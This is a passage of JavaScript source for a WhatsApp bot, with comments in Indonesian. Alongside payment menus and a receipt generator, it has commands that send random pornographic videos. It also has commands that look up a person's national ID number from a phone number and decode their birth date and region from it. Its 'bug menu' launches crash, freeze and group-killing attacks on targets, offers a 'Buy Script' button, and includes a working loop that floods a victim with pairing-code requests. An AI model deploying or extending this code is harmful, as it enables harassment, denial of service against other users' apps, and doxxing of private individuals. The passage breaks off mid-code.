                            body: `📍 Paju-si, South Korea`,
                            thumbnailUrl: global.thumb,
                            sourceUrl: global.linkSaluran,
                            mediaType: 1,
                            renderLargerThumbnail: false,
                        },
                    }
                }, { quoted: m });
        
                console.log("Paptt berhasil dikirim!");
            } catch (err) {
                console.error("Error mengirim Paptt", err);
            }
        
        }
        break
        //END
        //════════════════════════════════════//
        case 'random-bokep': case 'bokep': {
            if(!isOwner && !isPremium) return; 
        
            try {
                let anu = [
                    `\`[ # ]\` Tch.. Dasar Sangean lu om`,
                    `\`[ # ]\` Udah Gak Tahan Kah Dek?`,
                    `\`[ # ]\` Gesek Terus Sampe Lecet..`,
                    `\`[ # ]\` Coli ae terusss...`
                ]
                const anunya = anu[Math.floor(Math.random() * anu.length)];
                const bokep = [
                    "https://files.catbox.moe/sxhzbk.mp4",
                    "https://files.catbox.moe/alm36k.mp4",
                    "https://files.catbox.moe/t5mrnt.mp4",
                    "https://files.catbox.moe/bc8t3b.mp4",
                    "https://files.catbox.moe/8c7gz3.mp4", 
                    "https://files.catbox.moe/nk5l10.mp4", 
                    "https://files.catbox.moe/r3ip1j.mp4", 
                    "https://files.catbox.moe/71l6bo.mp4", 
                    "https://files.catbox.moe/rdggsh.mp4", 
                    "https://files.catbox.moe/3288uf.mp4", 
                    "https://files.catbox.moe/jdopgq.mp4", 
                    "https://files.catbox.moe/8ca9cw.mp4", 
                    "https://files.catbox.moe/b99qh3.mp4", 
                    "https://files.catbox.moe/6bkokw.mp4", 
                    "https://files.catbox.moe/ebisdh.mp4", 
                    "https://files.catbox.moe/3yko44.mp4", 
                    "https://files.catbox.moe/apqlvo.mp4", 
                    "https://files.catbox.moe/wqe1r7.mp4", 
                    "https://files.catbox.moe/nk5l10.mp4", 
                    "https://files.catbox.moe/8c7gz3.mp4", 
                    "https://files.catbox.moe/wqe1r7.mp4", 
                    "https://files.catbox.moe/n37liq.mp4", 
                    "https://files.catbox.moe/0728bg.mp4", 
                    "https://files.catbox.moe/p69jdc.mp4", 
                    "https://files.catbox.moe/occ3en.mp4", 
                    "https://files.catbox.moe/y8hmau.mp4", 
                    "https://files.catbox.moe/tvj95b.mp4", 
                    "https://files.catbox.moe/3g2djb.mp4", 
                    "https://files.catbox.moe/xlbafn.mp4", 
                    "https://files.catbox.moe/br8crz.mp4", 
                    "https://files.catbox.moe/h2w5jl.mp4", 
                    "https://files.catbox.moe/8y32qo.mp4", 
                    "https://files.catbox.moe/9w39ag.mp4", 
                    "https://files.catbox.moe/gv4087.mp4", 
                    "https://files.catbox.moe/uw6qbs.mp4", 
                    "https://files.catbox.moe/a537h1.mp4", 
                    "https://files.catbox.moe/4x09p9.mp4", 
                    "https://files.catbox.moe/n992te.mp4", 
                    "https://files.catbox.moe/ltdsbm.mp4", 
                    "https://files.catbox.moe/rt62tl.mp4", 
                    "https://files.catbox.moe/y4rote.mp4", 
                    "https://files.catbox.moe/dxn5oj.mp4", 
                    "https://files.catbox.moe/tw6m9q.mp4", 
                    "https://files.catbox.moe/qfl235.mp4", 
                    "https://files.catbox.moe/q9f2rs.mp4", 
                    "https://files.catbox.moe/e5ci9z.mp4", 
                    "https://files.catbox.moe/cdl11t.mp4", 
                    "https://files.catbox.moe/pmyi1y.mp4" 
                ];
                const bokepnjir = bokep[Math.floor(Math.random() * bokep.length)];
                await sock.sendMessage(m.chat, {
                    video: { url: bokepnjir },
                    caption: anunya,
                    mentions: [sender],
                    contextInfo: {
                        forwardingScore: 99999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran 
                        },
                        externalAdReply: {
                            title: `${global.dev} - Assistant`,
                            body: `📍 Paju-si, South Korea`,
                            thumbnailUrl: global.thumb,
                            sourceUrl: global.linkSaluran,
                            mediaType: 1,
                            renderLargerThumbnail: false,
                        },
                    }
                }, { quoted: m });
                console.log("Pokeb berhasil dikirim!");
            } catch (err) {
                console.error("Error mengirim Pokeb", err);
            }
        }
        break
        //═══════════════════════════════════//
        case 'nsfw': {
            if (!isOwner && !isPremium) return reply(msg.owner)
            await sock.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }});
            try {
                reply('🔞 Mengambil konten NSFW, sabar boss...')
            
                const data = await randomNsFw()
                const result = data[Math.floor(Math.random() * data.length)]
            
                const caption = `*🔞 NSFW Content*\n\n` +
                `*Judul:* ${result.title}\n` +
                `*Kategori:* ${result.category}\n` +
                `*Views:* ${result.views_count}\n` +
                `*Share:* ${result.share_count}\n` +
                `*Link:* ${result.link}`
            
                await sock.sendMessage(m.chat, {
                video: { url: result.video_1 },
                caption,
                mimetype: result.type
                }, { quoted: m })
            } catch (err) {
                console.error('Error NSFW:', err)
                reply('❌ Gagal mengambil konten NSFW.')
            }
        }
        break
    //═══════════════════════════════════//
    //PAYMENT MENU 
    //═══════════════════════════════════//
    case 'payment': case 'pay': {
        await sock.sendMessage(m.chat, { react: { text: `🥶`, key: m.key }});
        let kiris = 
`-----「 \`▧ ALL PAYMENT\` 」-----
        
🛒 \`NOTE\` :
Wajib Membawa Bukti Transfer. Jika Tidak Membawa, Maka Pesanan Tidak Akan Di Proses
        
        `
        const selectButton = [
            {
                buttonId: 'action',
                buttonText: { displayText: 'Other Payment' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: "Select Payment Methods",
                        sections: [
                            {
                            title: `⬨ Cancer Trashflocks - Options`,
                            highlight_label: "⌯ The Best Choice ⌯",
                            rows: [
                                    {
                                        header: "DANA PAYMENT",
                                        title: "Klik Opsi ini",
                                        description: `Jika anda ingin transfer via dana`,
                                        id: `${prefix}dana`
                                    },
                                    {
                                    header: "⌯ GOPAY PAYMENT ⌯",
                                    title: "Klik Opsi ini",
                                    description: `Jika anda ingin transfer via Gopay`,
                                    id: `${prefix}gopay`
                                    },
                                    {
                                        header: "⌯ OVO PAYMENT ⌯",
                                        title: "Klik Opsi ini",
                                        description: `Jika anda ingin transfer via dana`,
                                        id: `${prefix}ovo`
                                    }
                                ]
                            }
                        ]
                    })
                }
            }
        ]
        const buttonSelectMsg = {
            image: { url: `${global.qris}` },
            caption: kiris,
            footer: `${global.footer}`,
            buttons: [ ...selectButton,
            { buttonId: `${prefix}owner`, buttonText: { displayText: '⬨ Owner' }, type: 1 },
            ],
            viewOnce: true
        } 
        await sleep(1500)
        sock.sendMessage(m.chat, buttonSelectMsg, { quoted: contactQ })
    }
    break
    //════════════════════════════════════//
    case 'payment2': case 'pay2': {
        if (!isOwner && !isPremium) return reply(msg.owner)
        await sock.sendMessage(m.chat, { react: { text: `🥶`, key: m.key }});
        let kiris =
    `   -----「 \`▧ ALL PAYMENT\` 」-----
    
⚡ *DANA*     : ${global.dana}
    ⚠   A/N    : \`${global.atasnama}\`
⚡ *OVO*      : ${global.ovo}
    ⚠   A/N    : \`${global.atasnama}\`
⚡ *GOPAY*   : ${global.gopay}
    ⚠   A/N    : \`${global.atasnama}\`
    
    \`🛒 NOTE\` :
Wajib Membawa Bukti Transfer. Jika Tidak Membawa Maka Pesanan Tidak Akan Di Proses
    
    `
    
    await sleep(1500)
    sock.sendMessage(m.chat, {
            image: { url: `${global.qris}` },
            buttons: [{ buttonId: `${prefix}pay`, buttonText: { displayText: 'Payment Buttons'}, type: 1 }],
            headerType: 4,
            caption: kiris,
            footer: `${global.footer}`,
        }, { quoted: m })
        await sleep(3000)
    }
    break
    //════════════════════════════════════//
    case 'qris': case 'qr': {
        await sock.sendMessage(m.chat, { react: { text: `🥶`, key: m.key }});
        let kiris = [
` ╰⪩｟   *ALL PAYMENT*    ｠⪨╯

\n> \`▧ JANGAN LUPA KIRIM BUKTI TF, AGAR  SAYA PROSES\`🛒 ` ]
        
        sock.sendMessage(m.chat, {
                image: { url: `${global.qris}` },
                caption: kiris,
                footer: `\n\n${global.footer}`,
            }, { quoted : m })
            await sleep(1000)
    }
    break
    //════════════════════════════════════//
    case 'donasi': {
        await sock.sendMessage(m.chat, { react: { text: `🥶`, key: m.key }});
        
        sock.sendMessage(m.chat, {
                image: { url: `${global.qris}` },
                caption: `${global.donasi}`,
                footer: `\n\n${global.footer}`,
            }, { quoted : m })
            await sleep(1000)
    }
    break
    //════════════════════════════════════//
    case 'dana': {
        if (!isOwner && !isPremium) return reply(msg.owner)
        await sleep(1500)
        await sock.sendMessage(m.chat, { react: { text: `🥶`, key: m.key }})
    
        let kiris = `\`[ # NOTE ]\`\n*Wajib Membawa Bukti Transfer. Jika Tidak Membawa Maka Pesanan Tidak Akan Di Proses*\n\n`
    
        let Msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                    interactiveMessage: {
                        footer: { text: `${global.footer}` },
                        body: { text: kiris },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "📋 Copy DANA",
                                        copy_code: global.dana
                                    })
                                }
                            ], 
                        },
                    },
                }, 
            }, 
        },{ quoted : m });
        await sleep(1500)
        await sock.relayMessage( Msg.key.remoteJid, Msg.message,{ messageId: Msg.key.id })
    }
    break
    //═══════════════════════════════════//
    case 'gopay': {
        if (!isOwner && !isPremium) return reply(msg.owner)
        await sleep(1500)
        await sock.sendMessage(m.chat, { react: { text: `🥶`, key: m.key }})
        
        let kiris = `\`[ # NOTE ]\`\n*Wajib Membawa Bukti Transfer. Jika Tidak Membawa Maka Pesanan Tidak Akan Di Proses*\n\n`
        
        let Msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                    interactiveMessage: {
                        footer: { text: `${global.footer}` },
                        body: { text: kiris },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "📋 Copy GOPAY",
                                        copy_code: global.gopay
                                    })
                                }
                            ], 
                        },
                    },
                
                }, 
            }, 
        },{ quoted : m });
        await sleep(1500)
        await sock.relayMessage( Msg.key.remoteJid, Msg.message,{ messageId: Msg.key.id })
    }
    break
    //══════════════════════════════════//
    case 'ovo': {
    if (!isOwner && !isPremium) return reply(msg.owner)
    await sleep(1500)
    await sock.sendMessage(m.chat, { react: { text: `🥶`, key: m.key }})
    
    let kiris = `\`[ # NOTE ]\`\n*Wajib Membawa Bukti Transfer. Jika Tidak Membawa Maka Pesanan Tidak Akan Di Proses*\n\n`
    
    let Msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                interactiveMessage: {
                    footer: { text: `${global.footer}` },
                    body: { text: kiris },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "📋 Copy OVO",
                                    copy_code: global.ovo
                                })
                            }
                        ], 
                    },
                },
            }, 
        }, 
    },{ quoted : m });
    await sleep(1500)
    await sock.relayMessage( Msg.key.remoteJid, Msg.message,{ messageId: Msg.key.id })
    }
    break
    //════════════════════════════════════//
    case 'dne':
    case 'done': {
        if (!isOwner) return; 
        if (!q) return reply(`${noticenya}\nContoh: .done Nama Barang, Harga, Via Pembayaran`);
        await sock.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        const args = text.split(',');
        if (args.length < 3) return reply(`${noticenya} Pastikan Formatnya Sesuai!\nContoh: .done Nama Barang, Harga, Via Pembayaran`);

        const [namaBarang, harga, viaPembayaranRaw] = args.map(arg => arg.trim());
        const viaPembayaran = viaPembayaranRaw.toUpperCase();

        // Daftar metode pembayaran yang diizinkan
        const metodePembayaran = ['DANA', 'GOPAY', 'QRIS', 'BANK', 'OVO'];

        if (!metodePembayaran.includes(viaPembayaran)) {
            return reply(`❌ Metode pembayaran tidak valid!\nPilih salah satu:\n${metodePembayaran.join('\n')}`);
        }

        // Format tanggal otomatis
        const currentDate = new Date();
        const options = { timeZone: 'Asia/Jakarta', year: 'numeric', month: 'long', day: 'numeric' };
        const formattedDate = currentDate.toLocaleDateString('id-ID', options);

        const fler = {
            text: 
`❏━━『 ❖ *\`TRANSAKSI SELESAI\`* 』━━
┣✦ 📦 PRODUK : *${namaBarang}*
┣✦ 📤 HARGA : *Rp ${harga}.000*
┣✦ 💳 VIA : *${viaPembayaran}*
┣✦ 📆 TANGGAL : *${formattedDate}*
┗━═┅═━━━═┅═━━━═┅═━━━๑
*TERIMAKASIH ATAS KEPERCAYAAN NYA 🙏*

© ${global.namaStore}`
        };
        await sock.sendMessage(m.chat, fler, { quoted: contactQ });
    }
    break;
    //════════════════════════════════════//
    case 'struk': {
        if (!isOwner) return;
        if (!text) return reply(`${noticenya}\n${prefix + command} NamaToko|AlamatToko|NomorStruk|NamaKasir|NamaCustomer|NomorSeller|Status|Nama Barang,qty,harga;Nama Barang,qty,harga;Nama Barang,qty,harga`)

        const QRCode = require('qrcode')
    
        let data = text.split('|')

        if (data.length < 8)
          return reply('❌ data struk tidak lengkap\nMinimal 8 field')
        
        let [ toko, alamat, trx, kasir, customer, seller, status, itemRaw ] = data
        
        // === ITEM PARSER (1 atau banyak) ===
        let items = itemRaw.split(';').map(v => {
          let [nama, qty, harga] = v.split(',')
          if (!nama || !qty || !harga) return null
          return {
            nama: nama.trim(),
            qty: Number(qty),
            harga: Number(harga)
          }
        }).filter(Boolean)
        
        if (items.length === 0)
          return reply('❌ format item salah\nContoh: Produk,1,20000')
    
        const validStatus = ["done", "dp", "cicil", "hutang"]
        if (!validStatus.includes(status.toLowerCase()))
            return reply("❌ Status harus: done / dp / cicil / hutang")
    
        // HITUNG TOTAL
        let total = items.reduce((a, b) => a + (b.qty * b.harga), 0)
    
        // CANVAS SIZE
        const width = 420
        const height = 500 + items.length * 40
        const canvas = createCanvas(width, height)
        const ctx = canvas.getContext('2d')
    
        // BACKGROUND
        ctx.fillStyle = "#fff"
        ctx.fillRect(0, 0, width, height)
    
        // WATERMARK (ANTI EDIT)
        ctx.save()
        ctx.translate(width / 2, height / 2)
        ctx.rotate(-Math.PI / 4)
        ctx.globalAlpha = 0.08
        ctx.font = "bold 42px sans-serif"
        ctx.fillStyle = "#000"
        ctx.fillText(`${global.namaStore}`, -220, 0)
        ctx.restore()
        ctx.globalAlpha = 1
    
        let y = 20
    
        // LOGO
        const logoPath = "./lib/Image/logo.png"
        if (fs.existsSync(logoPath)) {
            const logo = await loadImage(logoPath)
            ctx.drawImage(logo, (width - 100) / 2, y, 100, 100)
            y += 110
        }
    
        // HEADER
        ctx.fillStyle = "#000"
        ctx.textAlign = "center"
        ctx.font = "bold 18px monospace"
        ctx.fillText(toko, width / 2, y)
        ctx.font = "12px monospace"
        ctx.fillText(alamat, width / 2, y += 18)
        ctx.fillText(trx, width / 2, y += 18)
    
        ctx.fillText("-".repeat(60), width / 2, y += 20)
    
        const now = new Date()
        const tanggal = now.toLocaleDateString("id-ID")
        const waktu = now.toLocaleTimeString("id-ID")
    
        // INFO
        ctx.textAlign = "left"
        ctx.fillText(tanggal, 20, y += 25)
        ctx.textAlign = "right"
        ctx.fillText(kasir, width - 20, y)
    
        ctx.textAlign = "left"
        ctx.fillText(waktu, 20, y += 18)
        ctx.textAlign = "right"
        ctx.fillText(customer, width - 20, y)
    
        ctx.textAlign = "left"
        ctx.fillText("Status", 20, y += 18)
        ctx.textAlign = "right"
        ctx.fillText(status.toUpperCase(), width - 20, y)
    
        ctx.textAlign = "center"
        ctx.fillText("-".repeat(60), width / 2, y += 20)
    
        // ITEMS
        ctx.textAlign = "left"
        items.forEach(it => {
            ctx.fillText(it.nama, 20, y += 25)
            ctx.fillText(`${it.qty} x ${it.harga.toLocaleString()}`, 20, y += 15)
            ctx.textAlign = "right"
            ctx.fillText(`Rp ${(it.qty * it.harga).toLocaleString()}`, width - 20, y)
            ctx.textAlign = "left"
        })
    
        ctx.textAlign = "center"
        ctx.fillText("-".repeat(60), width / 2, y += 25)
    
        // TOTAL
        ctx.textAlign = "left"
        ctx.font = "bold 14px monospace"
        ctx.fillText("TOTAL", 20, y += 25)
        ctx.textAlign = "right"
        ctx.fillText(`Rp ${total.toLocaleString()}`, width - 20, y)
    
        ctx.textAlign = "center"
        ctx.font = "12px monospace"
        ctx.fillText("-".repeat(60), width / 2, y += 25)
    
        // QR CHAT SELLER
        const waLink = `https://wa.me/${seller.replace(/[^0-9]/g, "")}`
        const qrBuffer = await QRCode.toBuffer(waLink)
        const qr = await loadImage(qrBuffer)
    
        ctx.drawImage(qr, (width - 120) / 2, y += 10, 120, 120)
        ctx.fillText("Scan Me for ORDER", width / 2, y + 135)
    
        ctx.font = "10px monospace"
        ctx.fillText("Harap Simpan Struk ini dengan baik.", width / 2, y + 150)
    
        const buffer = canvas.toBuffer("image/png")
    
        await sock.sendMessage(
            m.chat,
            { image: buffer, caption: "🧾 *Struk Pembelian*" },
            { quoted: m }
        )
    }
    break
    //═══════════════════════════════════//
    case "shutdown": case 'st': {
      if (!isDeveloper) return reply('❗ *Akses Ditolak*\nFitur Only `Developer`')
        await shutdownBot();
        reply("Bot DiNonAktifkan oleh developer, Harap tunggu Developer meng-input Access Key kembali");
        await sock.sendMessage(devNumber, { 
          text: "Hai developer, Access Key belum dimasukkan, bot sementara DiNonAktifkan" }, 
          { quoted: m})
    }
    break
    //═══════════════════════════════════//
    case 'getnik': {
      if (!isOwner && !isPremium) return reply(msg.owner)
      if (!q) return reply(`${noticenya} Contoh: ${prefix + command} 628xxx`);
    
      let pepec = q.replace(/[^0-9]/g, "");
      if (pepec.startsWith('0')) return reply(`❌ Nomor tidak boleh diawali 0. Gunakan kode negara. Contoh: ${prefix + command} 628xxx`);
    
      try {
        const api = `https://fastrestapis.fasturl.cloud/search/niknumber?getNikfromNumber=${encodeURIComponent(pepec)}`;
        const { data } = await axios.get(api);
    
        if (data.status !== 200 || !data.result || !data.result.getNikfromNumber) {
          return reply('❌ Data NIK tidak ditemukan!');
        }
    
        let nik = data.result.getNikfromNumber;
    
        let res = `*🔍 Hasil Pencarian NIK*\n`;
        res += `Nomor: ${pepec}\n`;
        res += `NIK: ${nik}\n`;
    
        reply(res);
      } catch (err) {
        reply('❌ Gagal mengambil data NIK atau API sedang bermasalah.');
      }
    }
    break;
    //════════════════════════════════════//
    case 'parsenik': {
      if(!isOwner && !isPremium) return reply(msg.owner)
      if (!text) return reply('Contoh: .detailnik 6203011408000006');
      try {
      if (!/^\d{16}$/.test(text)) return reply('❌ Format NIK tidak valid (16 digit angka)');

      const provId = text.substring(0, 2);
      const kabId = text.substring(0, 4);
      const kecId = text.substring(0, 6);
      const kodePos = text.substring(12, 16);
      const kelaminKode = parseInt(text.substring(6, 8));
      const tanggal = kelaminKode > 40 ? kelaminKode - 40 : kelaminKode;
      const bulan = parseInt(text.substring(8, 10));
      const tahun = parseInt(text.substring(10, 12));
      const kelamin = kelaminKode > 40 ? 'Perempuan' : 'Laki-Laki';
      const tahunLahir = tahun < 25 ? 2000 + tahun : 1900 + tahun;
      const tanggalLahir = moment(`${tahunLahir}-${bulan}-${tanggal}`, 'YYYY-MM-DD').format('DD-MM-YYYY');
    
      // Ambil data dari API Wilayah Indonesia
      const [provRes, kabRes, kecRes] = await Promise.all([
      axios.get(`https://emsifa.github.io/api-wilayah-indonesia/api/provinces.json`),
      axios.get(`https://emsifa.github.io/api-wilayah-indonesia/api/regencies/${provId}.json`),
      axios.get(`https://emsifa.github.io/api-wilayah-indonesia/api/districts/${kabId}.json`)
      ]);
    
      const provinsi = provRes.data.find(p => p.id == provId)?.name || 'Tidak Diketahui';
      const kabupaten = kabRes.data.find(k => k.id == kabId)?.name || 'Tidak Diketahui';
      const kecamatan = kecRes.data.find(kc => kc.id == kecId)?.name || 'Tidak Diketahui';
    
      const hasil = `
✅ Success in Getting Info 📣
    
❏ NIK: ${text}
❏ Provinsi ID: ${provId}
❏ Nama Provinsi: ${provinsi}
❏ Kabupaten/Kota ID: ${kabId}
❏ Nama Kabupaten/Kota: ${kabupaten}
❏ Kecamatan ID: ${kecId}
❏ Nama Kecamatan: ${kecamatan}
❏ Kode Pos: ${kodePos}
❏ Jenis Kelamin: ${kelamin}
❏ Tanggal Lahir: ${tanggalLahir}
❏ Uniqcode: ${kodePos}
════════════════════
Bot Create By @ItssDric
    `.trim();
      reply(hasil);
      } catch (err) {
      console.error(err);
      reply('❌ Terjadi kesalahan saat memproses NIK. Pastikan format NIK benar atau server API sedang bermasalah.');
      }
    }
    break
    //════════════════════════════════════//
    //=============== BUG MENU </> ===============//
    //═══════════════════════════════════//
    case 'bug': {
        if (!isOwner && !isMurbug) return reply('khusus owner & user Murbug')
        
        if (!q) return reply(`Example Use.\n ${prefix + command} 62xx <amount>`)
        
        let args = q.split(" ")
        let jidx = args[0].replace(/[^0-9]/g, "")
        let amount = parseInt(args[1])
    
        if (jidx.startsWith('0')) return reply(`The number starts with the number 0. Replace it with the number starting with the country code\n\nExample : ${prefix + command} 62xxx`)
        if (!amount) return reply(`Please specify the amount.\n\nExample : ${prefix + command} ${jidx} 5`)
    
        let target = jidx + '@s.whatsapp.net'
    
        let confirmMsg = {
            video: { url: global.mp4 },
            gifPlayback: true,
            caption: `⨭ *CONFIRMATION*
    
    — Are You Sure Want To Attack?
    ⭔ Target : *${jidx}*
    ⭔ Amount : *${amount}*
    ⭔ Choose Your Attack Method Below:`,
            footer: `\n${global.footer}`,
            buttons: [
                {
                    buttonId: 'action',
                    buttonText: { displayText: 'Select Attack Method' },
                    type: 4,
                    nativeFlowInfo: {
                        name: 'single_select',
                        paramsJson: JSON.stringify({
                            title: "—ATTACK MODE",
                            sections: [
                                {
                                    title: `—Automatic Attacking Target`,
                                    highlight_label: "High Risk",
                                    rows: [
                                        { header: "▸ FORCE CLOSE", title: "‹!› Crash Invisible Attack", description: `Crashing Target With Invisible`, id: `${prefix}glitch-crash ${target} ${amount}` },
                                        { header: "▸ BLANK", title: "‹!› Blank Ui Attack", description: `Target Will Be Blank Ui System`, id: `${prefix}Glitch-blank ${target} ${amount}` },
                                        { header: "▸ DELAY INVISIBLE", title: "‹!› Delay Hard Attack", description: `Whatsapp Target Will Be Delay`, id: `${prefix}glitch-delay ${target} ${amount}` },
                                        { header: "▸ FREEZE", title: "‹!› Freeze Attack", description: `Freezing The Target's App`, id: `${prefix}glitch-freeze ${target} ${amount}` },
                                        { header: "▸ COMBO", title: "‹!› Combo Attack", description: `Combining Multiple Attacks`, id: `${prefix}glitch-combo ${target} ${amount}` },
                                    ]
                                },
                                {
                                    title: `—IOS Crash Mode`,
                                    highlight_label: "Critical Risk",
                                    rows: [
                                        { header: "▸ IOS CRASH", title: "‹!› iOS Crash Attack", description: `Crashing iOS Devices`, id: `${prefix}glitch-ios ${target} ${amount}` }
                                    ]
                                },
                                {
                                    title: `—Call Spam Mode`,
                                    highlight_label: "Next Version",
                                    rows: [
                                        { header: "▸ SPAM PAIRING",
                                            title: "‹!› Spam Pairing Attack", 
                                            description: `Repeatedly Calling The Target`, id: `.spampair ${target}` 
                                        },
                                        { header: "▸ SPAM CALL VIDEO", 
                                            title: "‹!› Spam Video Call Attack", 
                                            description: `Flooding Target With Video Calls`, id: `.forclose ${target}` 
                                        },
                                        { header: "▸ BRUTAL SPAM CALL", 
                                            title: "‹!› Spam Infinite Call Attack", 
                                            description: `Flooding Brutally Target With Calls`, id: `.forclose ${target}` 
                                        }
                                    ]
                                }
                            ]
                        })
                    },
                    viewOnce: true
                },
                { buttonId: `${prefix}sc`, buttonText: { displayText: 'Buy Script' }, type: 1 }
            ],
            headerType: 4,
            viewOnce: true
        }
    
        await sock.sendMessage(m.chat, confirmMsg, { quoted: contactQ })
    }
    break
    //═════════════════════════════════════//
    case 'spairing':
    case 'spam-pairing':
    case 'spampair': {
        if (!isOwner && !isMurbug) return reply('khusus owner & user Murbug')
        if (!text) return reply(`*Example:* ${prefix + command} 628xxxxxx 10`)
      
        reply('proses...')
      
        // parsing: nomor & jumlah
        let args = text.trim().split(/\s+/)
        let target = (args[0] || '').replace(/[^0-9]/g, '')
        let total = parseInt(args[1]) || 1
      
        if (!target) return reply('Nomor tidak valid!')
        if (total < 1) return reply('Jumlah minimal 1')
      
        const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
        const pino = require('pino')
      
        const { state } = await useMultiFileAuthState('pepek')
        const { version } = await fetchLatestBaileysVersion()
      
        const sucked = makeWaSocket({
            auth: state,
            version,
            logger: pino({ level: 'fatal' })
        })
      
        const sleep = ms => new Promise(res => setTimeout(res, ms))
      
        for (let i = 0; i < total; i++) {
            await sleep(1500)
            let prc = await sucked.requestPairingCode(target)
            console.log(`Success Spam Pairing | ${target} | ${prc}`)
        }
      
        await sleep(15000)
    }
    break
    //═══════════════════════════════════//
    case "gb1": case 'kill-gb': {
      if (!isOwner && !isMurbug) return reply("Lu Siapa Bego? Khusus Premium");
      if (!q) return reply(`Example: \n${prefix + command} https://chat.whatsapp.com/`);
      let result = args[0].split("https://chat.whatsapp.com/")[1];
      let target = await sock.groupAcceptInvite(result);
      await KillGc(sock, target, false);
      await sleep(1000)
      rDone(`[ √ ] Success Bug : ${result}\n[ √ ]Using : ${prefix + command}\n[ √ ] Target Status : Die\n[ ⚠️ ] Please Don\'t Use Bug In 10 Minute`)
    }
    break
    //═════════════════════════════════════//
    case "gb2": case 'blank-gb': {
      if (!isOwner && !isMurbug) return reply("Lu Siapa Bego? Khusus Premium");
      if (!q) return reply(`Example: \n${prefix + command} https://chat.whatsapp.com/`);
      let result = args[0].split("https://chat.whatsapp.com/")[1];
      let target = await sock.groupAcceptInvite(result);
      await GB2(target);
      rDone(`[ √ ] Success Bug : ${result}\n[ √ ]Using : ${prefix + command}\n[ √ ] Target Status : Die\n[ ⚠️ ] Please Don\'t Use Bug In 10 Minute`)
    }
    break
    //═══════════════════════════════════//
    case 'duarr': {
        if (!isOwner) return reply("Lu Siapa Bego? Khusus Premium");
        await sock.sendMessage(m.chat, { react: { text: '⚡️', key: m.key } })
        for (let i = 0; i < 2; i++) {
            await KillGc(m.chat);
            await sleep(500)
        }
    }
    break
    //═════════════════════════════════════//
    case 'glitch-group':
    case 'group-delay': {
        if (!isOwner && !isMurbug) return reply("Lu Siapa Bego? Khusus Premium");
        await reaction(m.chat, "♠️")
        for (let i = 0; i < 20; i++) {
            await CancerDelayGb(m.chat);
            await sleep(1000)
        }
    }
    break
    //═══════════════════════════════════//
    case 'ahhh': {
        if (!isOwner) return reply("Lu Siapa Bego? Khusus Premium");
        for (let i = 0; i < 1; i++) {
            await fuckgroup(m.chat,)
            await sleep(500)
        }
    }
    break
    //═════════════════════════════════════//
    case 'porklos': {
        if (!isOwner) return reply("Lu Siapa Bego? Khusus Premium");
        try {
            await PorklosGroup(m.chat)
        } catch (err) {
          console.log('Gagal Kirim Porklos', err)
        }
    }
    break
    //═════════════════════════════════════//
    //BUG Private FEATURE
    case 'clearbug': case 'clear': {
      if (!isOwner) return reply(msg.owner)
      try {
        for (let i = 0; i < 5; i++) {
          sock.sendMessage(m.chat, {text: `*BUG CLEARED BY 💦${global.botname}*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${global.footer}`})
          await sleep(2000)
        }
      } catch (err) {
        console.log(`Gagal mengirim clear bug`, err);
      }  
      await reply(`✅ CLEAR BUG SELESAI`)
    }
    break
    //═══════════════════════════════════//
    case 'clearbug2': case 'clear2': {
        if (!isOwner) return reply(msg.owner)
    
        if (!q) return reply(
            `❌ Masukkan ID grup\n\nContoh:\n${prefix + command} 123456789@g.us`
        )
    
        // ambil id grup, pisah koma
        let groups = q.split(',')
            .map(v => v.trim())
            .filter(v => v.endsWith('@g.us'))
    
        if (!groups.length)
            return reply('❌ ID grup tidak valid')
    
        let sukses = 0
        let gagal = 0
    
        for (let gid of groups) {
            try {
                for (let i = 0; i < 5; i++) {
                    await sock.sendMessage(gid, {
